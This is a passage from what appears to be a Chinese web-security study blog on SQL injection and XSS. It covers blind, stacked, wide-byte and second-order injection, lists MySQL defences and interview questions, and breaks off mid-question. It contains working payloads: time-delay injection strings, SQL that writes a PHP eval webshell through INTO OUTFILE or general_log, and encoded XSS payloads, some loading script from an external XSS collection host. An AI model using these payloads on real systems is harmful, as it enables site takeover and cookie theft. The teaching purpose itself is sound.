<p>详细解析：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_60988110/article/details/123544853?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168958636516800188531170%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168958636516800188531170&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-123544853-null-null.142%5Ev88%5Einsert_down38v5,239%5Ev2%5Einsert_chatgpt&amp;utm_term=updatexml%28%29%E5%87%BD%E6%95%B0&amp;spm=1018.2226.3001.4187">updatexml函数-报错注入原理学习</a></p>
<h4 id="堆叠查询注入"><a class="header-anchor" href="#堆叠查询注入">¶</a>堆叠查询注入</h4>
<p>​		在分号结束后并不会结束执行，继续构造下一条语句，语句依然会被执行。<strong>union或者union all</strong>执行的语句类型有限，而堆叠注入可以执行的是<strong>任意的SQL语句。</strong></p>
<p>使用条件苛刻，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query() 函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
<h4 id="基于布尔的盲注"><a class="header-anchor" href="#基于布尔的盲注">¶</a>基于布尔的盲注</h4>
<p>​		即在页面没有错误回显时完成的注入攻击，此时我们输入的语句让页面呈现出两种状态，相当于True和False，而根据这两种状态可以判断我们输入的语句是否查询成功。</p>
<p>​		<strong>流程</strong>：</p>
<img src="/posts/d62edc36/1683710880582-3d46ca6b-9367-4f1e-8ca6-448bd146cb98.png" class title="img">
<h4 id="基于时间的盲注"><a class="header-anchor" href="#基于时间的盲注">¶</a>基于时间的盲注</h4>
<p>​		基于时间的盲注也叫做延时注入，<strong>数据交互完成以后目标网站没有错误和正确的页面回显也没有布尔类型状态</strong>，此时我们可以考虑使用延时盲注其利用条件较为苛刻，这种情况我们可以利用时间函数来判断数据有没有在目标数据中得到执行，当然也需要构造闭合。</p>
<p>​		<strong>基础知识：</strong></p>
<p>​			<strong>if()函数  条件判断函数</strong><br>
​	if(a,b,c)  if判断句，a为条件，b、c为执行语句；如果a为真就执行b，a为假就执行c;</p>
<p>​			<strong>sleep()函数</strong></p>
<p>网页延迟n秒后，输出结果</p>
<p>​			<strong>ascii()函数/ord()函数</strong></p>
<p>将某个字符串转化为ascii值<br>
<strong>length()函数</strong></p>
<p>获取字符串的长度<br>
<strong>substr()/substring()/mid()函数</strong><br>
此函数是用来截取字符串一部分。substr(column_name,start,[length]),length为可选项。</p>
<p>​		<strong>时间盲注判断</strong><br>
​			?id=1’ and sleep(10)–+<br>
​			?id=1’ and if(1=2,1,sleep(10))–+</p>
<h4 id="HTTP头部注入"><a class="header-anchor" href="#HTTP头部注入">¶</a>HTTP头部注入</h4>
<p>​		常见的SQL注入一般是通过请求参数或者表单进行注入，而HTTP头部注入是通过HTTP协议头部字段值进行注入，<strong>HTTP头注入常存在于以上地方…即：User-Agent/Cookie/Referer/X-Forwarded-For</strong></p>
<p><strong>产生条件</strong></p>
<ol>
<li>
<p>能够对请求头消息进行修改</p>
</li>
<li>
<p>修改的请求头信息能够带入数据库进行查询</p>
</li>
<li>
<p>数据库没有对输入的请求信息做过滤</p>
</li>
</ol>
<h4 id="宽字节注入"><a class="header-anchor" href="#宽字节注入">¶</a>宽字节注入</h4>
<p>​		宽字节是指多个字节宽度的编码，GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两个自己。转移函数对这些编码进行转义时会将转义字符<code>'\'</code>转为**%5c**,于是我们在他们前面输入一个单字符编码与他组成一个新的多字符编码，使得原本的转义字符没有发生作用。</p>
<blockquote>
<ul>
<li>
<p>当某字符得大小为一个字节时，称其字符为窄字节</p>
</li>
<li>
<p>当某字符得大小为两个字节时，称其字符为宽字节</p>
</li>
<li>
<p>常见的宽字节编码：GB2312、GBK、GB18030、BIG5、Shift_JIS等</p>
</li>
</ul>
</blockquote>
<p><strong>原理</strong>：</p>
<p>​		由于在数据库查询前使用了GBK多字节编码，即在汉字编码范围内使用两个字节会被编码为一个汉字(前一个ASCII码要大于128才到汉字的范围)，然后MySQL服务器会对查询语句进行GBK编码，即在前面加上%df’转义函数会将%df’改成%df'而\的URL编码为%5c,那最后变成了%df%5c’并且在GBK中这两个字节对应着一个汉字&quot;運&quot;,也就是说转义已经失去了作用，%df’被认为成運’ 成功消除了转义函数的影响</p>
<h4 id="二阶注入"><a class="header-anchor" href="#二阶注入">¶</a>二阶注入</h4>
<p><strong>原理</strong></p>
<p>​		二次注入就是由于将数据存储进数据库中时未做好过滤，先提交构造好的特殊字符请求存储进数据库，然后提交第二次请求时与第一次提交进数据库的字符发生了作用，形成一条新的SQL语句被执行。</p>
<h4 id="DNSlog外带注入"><a class="header-anchor" href="#DNSlog外带注入">¶</a>DNSlog外带注入</h4>
<p>​		在实际的应用场景中，我们一般在进行SQL盲注时，为了效率，在load_file()函数未被禁用的情况下，我们可以结合一些dnslog平台，进行外带注入；</p>
<p>​		不管是布尔类型盲注还是时间盲注，都需要发送大量的数据包去判断数据，而这很可能会触发WAF的防护，因此导致被封IP。所以，如果条件允许，我们可以结合DNSlog来快速的回显数据。MySQL数据库，<strong>通过DNSlog盲注需要用到 load_file() 函数，该函数不仅能加载本地文件，同时也能对URL发起请求</strong>。<strong>因此需要使用 load_file() 函数，需要root权限，并且 secure_file_priv 需要为空。</strong></p>
<h4 id="GetShell"><a class="header-anchor" href="#GetShell">¶</a>GetShell</h4>
<p><strong>into outfile()</strong></p>
<p>在利用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=sql%E6%B3%A8%E5%85%A5&amp;spm=1001.2101.3001.7020">sql注入</a>漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个：</p>
<ul>
<li>
<p>into dumpfile()</p>
</li>
<li>
<p>into outfile()</p>
</li>
<li>
<p>load_file()</p>
</li>
<li>
<p>Web目录具有写入权限，能够使用单引号</p>
</li>
<li>
<p>知道网站绝对路径(网站根目录)</p>
</li>
<li>
<p>secure_file_priv没有具体值(在mysql/my.ini中查看)</p>
</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/102806591?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=dump%20outfile&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-102806591.142%5Ev88%5Einsert_down38v5,239%5Ev2%5Einsert_chatgpt&amp;spm=1018.2226.3001.4187">mysql注入中的outfile、dumpfile、load_file函数详解</a></p>
<p><strong>secure_file_priv</strong><br>
secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取（导入导出）文件的权限。在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL。如下关于secure_file_priv的配置介绍</p>
<p>secure_file_priv的值为null ，表示限制mysqld <strong>不允许</strong>导入|导出<br>
当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下<br>
当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</p>
<p><strong>into dumpfile()和into outfile()的差异</strong></p>
<p>​		outfile函数可以导出多行，而dumpfile只能导出一行数据。<br>
​		 outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式。</p>
<p><strong>–os-shell</strong></p>
<p>在SQLmap中的–os-shell就是使用udf提权获取WebShell。也是通过into oufile向服务器写入两个文件，一个可以直接执行系统命令，一个进行上传文件！</p>
<p>​	<strong>条件</strong></p>
<p>​	1.要求为数据库DBA，使用–is-dba查看当前网站连接的数据库账号是否为		mysql user表中的管理员如root，是则为dba</p>
<pre><code class="hljs">2. secure_file_priv没有具体值
</code></pre>
<p>​	3. 知道网站的绝对路径</p>
<blockquote>
<p>在使用SQLMAP写Shell时候知道网站根目录但就是写不进去，可能是由于secure_file_priv的值为NULL那么可以使用以下方式获取这个字段值是什么<br>
<a target="_blank" rel="noopener" href="http://sqlmap.py">sqlmap.py</a> -u “xxx” --sql-shell</p>
</blockquote>
<h2 id="SQL注入防御手段"><a class="header-anchor" href="#SQL注入防御手段">¶</a>SQL注入防御手段</h2>
<ol>
<li>函数过滤，如!is_numeric 涵数    //判断变量 id 是否为数字</li>
<li>直接下载相关防范注入文件，通过 incloud 包含放在网站配置文件里面，如 360、阿里云、腾迅提供的防注入脚本</li>
<li>使用白名单过滤</li>
<li>采用 PDO 预处理</li>
<li>使用 Waf 拦截</li>
</ol>
<h3 id="问题-v3"><a class="header-anchor" href="#问题-v3">¶</a>问题</h3>
<p><strong>如果存在SQL注入怎么判断不同的数据库?</strong></p>
<p>1.通过不同数据库对特定函数的处理不同</p>
<p>2.通过sql语法的差异</p>
<p><strong>注入常用函数</strong></p>
<p>version() user() database() concat() group_concat()</p>
<p><strong>mysql的网站注入，5.0以上和5.0以下有什么区别？</strong></p>
<p>5.0以下是多⽤户单操作，5.0以上是多⽤户多操作</p>
<p>5.0以下版本不存在information_schema数据库</p>
<p>5.0以上⽀持⼀些函数</p>
<p><strong>SQL注入写shell的条件</strong></p>
<p>1.数据库权限为dba（管理员权限）</p>
<p>2.secure_file_priv值为空</p>
<p>3.知道网站的绝对路径</p>
<p><strong>在时间盲注时若是sleep函数被过滤怎么办？</strong></p>
<p>使⽤ BENCHMARK(5000000,MD5(0x704c6b65))</p>
<p><strong>站点扫不到3306端口开放是什么原因？（为何一个 mysql 数据库的站，只有一个 80 端口开放）</strong></p>
<p>1.更改了数据库端口，没有扫描出来。</p>
<p>2.站库分离。</p>
<p>3.3306 端口不对外开放</p>
<p><strong>mysql写shell的方式</strong></p>
<p><em>⼀、创建数据表导入 shell</em></p>
<p>CREATE TABLE <code>mysql</code>.<code>shadow9</code> (<code>content</code> TEXT NOT NULL );</p>
<p>INSERT INTO <code>mysql</code>.<code>shadow9</code> (<code>content</code> ) VALUES (‘<?php @eval($_POST[pass]);?>’);</p>
<p>SELECT <code>content</code> FROM <code>shadow9</code> INTO OUTFILE ‘C:\phpStudy\WWW\90sec.php’;</p>
<p>DROP TABLE IF EXISTS <code>shadow9</code>;</p>
<p><em>⼆、⼀句话导入 shell</em></p>
<p>select ‘<?php @eval($_POST[pass]);?>’ into outfile ‘c:/phpstudy/www/90sec.php’;</p>
<p><em>三、⽇志备份获取 shell</em></p>
<p>show global variables like “%genera%”; //查询 general_log 配置</p>
<p>set global general_log=‘on’; //开启 general log 模式</p>
<p>SET global general_log_file=‘D:/phpStudy/WWW/cmd.php’; //设置⽇志⽂件保存路径</p>
<p>SELECT ‘<?php phpinfo();?>’; //phpinfo()写⼊⽇志⽂件</p>
<p>set global general_log=‘off’; //关闭 general_log 模式</p>
<h2 id="各种数据库的注入"><a class="header-anchor" href="#各种数据库的注入">¶</a>各种数据库的注入</h2>
<p>​	待补充…………</p>
<h1>SQL注入的WAF绕过（太多了慢慢补充<sup>V</sup>）</h1>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/csdnmmd/article/details/122721133">常见WAF与WAF识别工具</a></p>
<p><strong>空格字符绕过</strong></p>
<p><strong>大小写绕过</strong></p>
<p><strong>浮点数绕过注入</strong></p>
<p><strong>NULL 值绕过</strong></p>
<p><strong>引号绕过</strong></p>
<p><strong>添加库名绕过</strong></p>
<p><strong>去重复绕过</strong></p>
<p><strong>反引号绕过</strong></p>
<p><strong>脚本语言特性绕过</strong></p>
<p><strong>逗号绕过</strong></p>
<p><strong>substr 截取字符串</strong></p>
<p><strong>mid 截取字符串</strong></p>
<p><strong>使用 join 绕过</strong></p>
<p><strong>like 绕过</strong></p>
<p><strong>limit offset 绕过</strong></p>
<p><strong>or and xor not 绕过</strong></p>
<p><strong>ascii 字符对比绕过</strong></p>
<p><strong>等号绕过</strong></p>
<p><strong>双关键词绕过</strong></p>
<p><strong>二次编码绕过</strong></p>
<p><strong>多参数拆分绕过</strong></p>
<p><strong>使用生僻函数绕过</strong></p>
<p><strong>分块传输绕过</strong></p>
<p><strong>信任白名单绕过</strong></p>
<p><strong>静态文件绕过</strong></p>
<p><strong>pipline 绕过注入</strong></p>
<p><strong>利用 multipart/form-data 绕过</strong></p>
<p><strong>order by 绕过</strong></p>
<p><strong>运行大量字符绕过</strong></p>
<p><strong>花扩号绕过</strong></p>
<p><strong>使用 ALL 或者 DISTINCT 绕过</strong></p>
<p><strong>换行混绕绕过</strong></p>
<p><strong>编码绕过</strong></p>
<p><strong>HTTP 数据编码绕过</strong></p>
<p><strong>url 编码绕过</strong></p>
<p><strong>Unicode 编码绕过</strong></p>
<p><strong>union select 绕过</strong></p>
<h1>XSS</h1>
<blockquote>
<p>​		XSS 攻击全称跨站脚本攻击。XSS 是一种在 web 应用中的计算机安全漏洞，它允许恶意 web 用户将代码植入到 web 网站里面，供给其它用户访问，当用户访问到有恶意代码的网页就会产生 xss 攻击。</p>
</blockquote>
<h2 id="基础"><a class="header-anchor" href="#基础">¶</a>基础</h2>
<p><strong>原理</strong>：</p>
<p>​		目标未对用户从前端功能点输入的数据与输出的内容进行处理或者处理不当，从而导致恶意的JS代码被执行造成窃取用户信息/劫持WEB行为危害的WEB漏洞！</p>
<p><strong>危害</strong>：</p>
<ul>
<li>
<p>网站挂马(WebShell)–&gt;攻击型网马(Google)</p>
</li>
<li>
<p>非法转账(Cookie窃取)</p>
</li>
<li>
<p>强制发送电子邮件</p>
</li>
<li>
<p>控制受害者机器向其它网站发起攻击</p>
</li>
<li>
<p>盗窃企业重要的具有商业价值的资料</p>
</li>
<li>
<p>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</p>
</li>
<li>
<p>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</p>
</li>
</ul>
<h2 id="XSS类型"><a class="header-anchor" href="#XSS类型">¶</a>XSS类型</h2>
<h3 id="反射型XSS"><a class="header-anchor" href="#反射型XSS">¶</a>反射型XSS</h3>
<p>​		反射型 XSS为非持久化攻击,需要欺骗用户自己去点击链接才能触发 XSS 代码,反射型 xss 攻击的方法为：攻击者通过发送邮件或诱导等方法，将包含有 xss 恶意链接发送给目标用户，当目标用户访问该链接时，服务器将接收该用户的请求并进行处理，然后服务器把带有 xss 恶意脚本发送给目标用户的浏览器，浏览器解析这段带有 xss 代码的恶意脚本后，就会触发 xss 攻击。</p>
<p><strong>漏洞挖掘点</strong></p>
<p>​	网站的搜索栏、用户登录入口、输入表单等地方，常用来窃取客户端cookies或钓鱼欺骗。</p>
<p><strong>攻击流程</strong></p>
<ol>
<li>攻击者将Payload放置在URL连接中(针对的是GET型反射XSS)</li>
<li>通过社会工程学使用户点击改恶意链接</li>
<li>Web服务器将XSS代码（JavaScript代码）以及视图返回给客户端</li>
<li>客户端解析视图以及XSS代码(JavaScript代码)，并执行结果发送到XSS平台</li>
<li>攻击者访问XSS平台，读取窃取到的用户敏感信息(Cookid)</li>
</ol>
<h3 id="存储型XSS"><a class="header-anchor" href="#存储型XSS">¶</a>存储型XSS</h3>
<p>​		存储型 XSS为持久化攻击，代码是存储在服务器中的数据库里，如在个人信息或发表文章等地方，可以插入代码，如果插入的数据没有过滤或过滤不严，那么这些恶意代码没有经过过滤将储存到数据库中，用户访问该页面的时候，没有进行编码过滤输出到浏览器上，就会触发代码执行，造成 xss 攻击。</p>
<p><strong>漏洞挖掘点</strong></p>
<ol>
<li>
<p>攻击者向Web界面插入恶意的XSS攻击代码</p>
</li>
<li>
<p>Web服务器会将其结果保存到数据库中</p>
</li>
<li>
<p>用户正常访问Web页面</p>
</li>
<li>
<p>Web页面将数据库的数据以及视图返回给前端，前端渲染并加载恶意的数据</p>
</li>
<li>
<p>客户端渲染视图，加载XSS代码并向攻击者的Web服务器发送敏感信息</p>
</li>
<li>
<p>攻击者读取用户的敏感信息</p>
</li>
</ol>
<h3 id="Dom类型XSS"><a class="header-anchor" href="#Dom类型XSS">¶</a>Dom类型XSS</h3>
<p>​		DOM，全称 <code>Document Object Model</code>，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。 DOM 型 XSS 其实是一种特殊类型的反射型 XSS，它是基于 DOM 文档对象模型的一种漏洞。 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的 Document object 文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过 DOM 来动态修改页面内容，从客户端获取 DOM 中的数据并在本地执行。基于这个特性，就可以利用 JS 脚本来实现 XSS 漏洞的利用。</p>
<p><strong>漏洞挖掘点</strong></p>
<p>​		通过js脚本对对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。</p>
<p><strong>漏洞利用攻击流程</strong></p>
<ol>
<li>攻击者将Payload放置咋URL链接中(针对GET型反射XSS)</li>
<li>用户点击恶意链接，并打开浏览器</li>
<li>此时浏览器客户端并不会发起HTTP请求到WEB服务器，而是在浏览器客户端执行XSS代码</li>
<li>此时将XSS代码执行结果发送给攻击者的恶意服务器</li>
<li>攻击者访问自己的XSS平台并读取用户的敏感信息</li>
</ol>
<h3 id="XSS攻击类型区别"><a class="header-anchor" href="#XSS攻击类型区别">¶</a>XSS攻击类型区别</h3>
<table>
<thead>
<tr>
<th>XSS类型</th>
<th>存储型</th>
<th>反射型</th>
<th>Dom型</th>
</tr>
</thead>
<tbody>
<tr>
<td>触发过程</td>
<td>1.黑客构造XSS脚本2.正常用户访问携带XSS脚本的页面</td>
<td>正常用户访问携带XSS脚本的URL</td>
<td>正常用户访问携带XSS脚本的URL</td>
</tr>
<tr>
<td>数据存储</td>
<td>数据库</td>
<td>URL</td>
<td>URL</td>
</tr>
<tr>
<td>谁来输出</td>
<td>后端WEB应用程序</td>
<td>后端WEB应用程序</td>
<td>前端JavaScript</td>
</tr>
<tr>
<td>输出位置</td>
<td>HTTP响应中</td>
<td>HTTP响应中</td>
<td>动态构造的Dom节点</td>
</tr>
</tbody>
</table>
<h3 id="Beef攻击平台"><a class="header-anchor" href="#Beef攻击平台">¶</a><strong>Beef攻击平台</strong></h3>
<p>​		极为流行的“BeEF”框架是世界上最流行的WEB框架攻击平台，全称为“<code>The Browser Exploitation Framework Project</code>”。它的原理是利用XSS漏洞，通过一段编写好的JavaScript（hook.js）控制目标主机的浏览器。“BeEF”本来的意思是牛肉，这个渗透框架一直在更新中，最新的版本中添加了很多高效的功能，另外一点极为优秀的地方就是这个渗透框架还可以与Metasploit完美地结合在一起。</p>
<p>项目地址：<a target="_blank" rel="noopener" href="http://github.com/beefproject/beef.git">http://github.com/beefproject/beef.git</a></p>
<p>Web界面管理控制台：<a target="_blank" rel="noopener" href="http://127.0.0.1:3000/ui/panel%E3%80%82%E7%94%A8%E4%BA%8E%E6%9F%A5%E7%9C%8B%E4%B8%8A%E9%92%A9%E7%9A%84%E9%B1%BC%E5%84%BF%E4%BB%A5%E5%8F%8A%E5%AF%B9%E4%B8%8D%E5%90%8C%E7%9A%84%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E7%AE%A1%E7%90%86%E6%93%8D%E4%BD%9C">http://127.0.0.1:3000/ui/panel。用于查看上钩的鱼儿以及对不同的目标进行管理操作</a><br>
shellcode探针：<a target="_blank" rel="noopener" href="http://127.0.0.1:3000/hook.js%EF%BC%8C%E5%8F%AA%E8%A6%81%E6%9C%89%E4%BA%BA%E8%BF%90%E8%A1%8C%E8%AF%A5%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B0%B1%E4%BC%9A%E5%9C%A8%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0%E4%B8%8A%E7%BA%BF%EF%BC%88%E4%B8%8A%E9%92%A9%EF%BC%89%E3%80%82">http://127.0.0.1:3000/hook.js，只要有人运行该文件，就会在管理控制台上线（上钩）。</a></p>
<p><strong>安装Beef</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> install beef-xss<br></code></pre></td></tr></table></figure>
<p>Kali已经把Beef-XSS做成服务了，使用systemctl命令来启动或关闭beef服务器.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl start beef-xss.service  //开启<br>systemctl stop beef-xss.service  //关闭<br>systemctl restart beef-xss.service //重启<br></code></pre></td></tr></table></figure>
<p>可能需要开启apache服务</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">service apache2 start<br></code></pre></td></tr></table></figure>
<p><strong>Beef联动MSF</strong></p>
<p>待补充……</p>
<h3 id="XSS绕过"><a class="header-anchor" href="#XSS绕过">¶</a>XSS绕过</h3>
<ol>
<li><strong>过滤标签</strong></li>
</ol>
<blockquote>
<p>在程序里如果使用 html 实体过滤，在 php 会使用 htmlspecialchars()对输入的字符进行实体化，实体化之后的字符不会在 html 执行。把预定义的字符 “&lt;” （小于） 和 “&gt;” （大于）转换为 HTML 实体，构造 xss 恶意代码大多数都必须使用&lt;或 者&gt;，这两个字符被实体化后在 html 里就不能执行了。</p>
<p>预定义字符：</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">&amp; (和号)成为 <span class="hljs-symbol">&amp;amp;</span> <br>&quot; (双引号)成为 <span class="hljs-symbol">&amp;quot;</span><br>&#x27; (单引号)成为 <span class="hljs-symbol">&amp;#039;</span><br>&lt; (小于)成为 <span class="hljs-symbol">&amp;lt;</span><br>&gt;(大于)成为 <span class="hljs-symbol">&amp;gt;</span>  <br></code></pre></td></tr></table></figure>
<p>但是有在 input 这些标签里是不用考虑标签实体化，因为用不上&lt;&gt;这两个标签：<br>
<code>  &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; onclick=&quot;javascript:alert('xss');&quot;/&gt;</code></p>
<ol start="2">
<li><strong>过滤Alert</strong></li>
</ol>
<p>用其他替换掉alert</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">prompt</span>(<span class="hljs-regexp">/xss/</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>confirm(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.xss123.com/eciAKj?1623635663</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
<ol start="3">
<li><strong>GPC过滤字符</strong></li>
</ol>
<p>如果 gpc 开启的时候，特殊字符会被加上斜杠即，'变成' ，xss 攻击代码不要带用单引号或双引号。<br>
绕过 gpc 在 php 高版本 gpc 默认是没有的，但是开发程序员会使用 addcslashes() 对特殊字符进行转义。</p>
<p>这个是执行不了的</p>
<p><code>&lt;script src='http://www.xss123.com/JGdbsl?1623638390'&gt;&lt;/script&gt;</code></p>
<p>没有单引号可执行</p>
<p><code>&lt;script src=http://www.xss123.com/JGdbsl?1623638390&gt;&lt;/script&gt; </code></p>
<ol start="4">
<li>
<p><strong>Ascii编码</strong></p>
<p><code>&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt; </code></p>
</li>
</ol>
<p>//fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串</p>
<ol start="4">
<li><strong>URL编码</strong></li>
</ol>
<p><code>&lt;a href=&quot;javascript:%61%6c%65%72%74%28%32%29&quot;&gt;123&lt;/a&gt;</code></p>
<ol start="5">
<li><strong>JS编码</strong></li>
</ol>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml">八进制编码<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;\141\154\145\162\164\50\61\51&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>16 进制编码<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;\x61\x6c\x65\x72\x74\x28\x31\x29&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>jsunicode 编码<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">\u0061\u006c\u0065\u0072\<span class="hljs-title function_">u0074</span>(<span class="hljs-string">&#x27;xss&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
<ol start="6">
<li><strong>HTML编码</strong></li>
</ol>
<blockquote>
<p>在=后可以解析 html 编码</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">十进制<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#41;</span>&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;confirm(&#x27;7<span class="hljs-symbol">&amp;#39;</span>);&quot;</span>&gt;</span>Button<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br>十六进制<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x31;</span><span class="hljs-symbol">&amp;#x29;</span>&quot;</span></span><br><span class="hljs-tag">/&gt;</span><br></code></pre></td></tr></table></figure>
<ol start="7">
<li><strong>Base64编码绕过</strong></li>
</ol>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">使用伪协议 base64 解码执行 xss <br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span>111<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>
<ol start="8">
<li>
<p><strong>构造事件绕过</strong></p>
<p>如果不能依靠属性进行跨站，那么还可以利用事件处理函数。<br>
<code>&lt;input type = &quot;button&quot;  value = &quot;clickme&quot; οnclick=&quot;alert('click me')&quot; /&gt; </code><br>
事件既能让JS脚本运行，自然也可以执行跨站，另外像onerror、onMouseover等都可利用的是事件处理函数;<br>
最后还可以使用fuzz大法去做模糊测试，然后构造payload,更事半功倍！</p>
</li>
</ol>
<h3 id="问题-v4"><a class="header-anchor" href="#问题-v4">¶</a><strong>问题</strong></h3>
<ol>
<li>给你一个存在XSS漏洞的网站后台，你接下来的攻击思路是什么？说一下详细的流程步骤。</li>
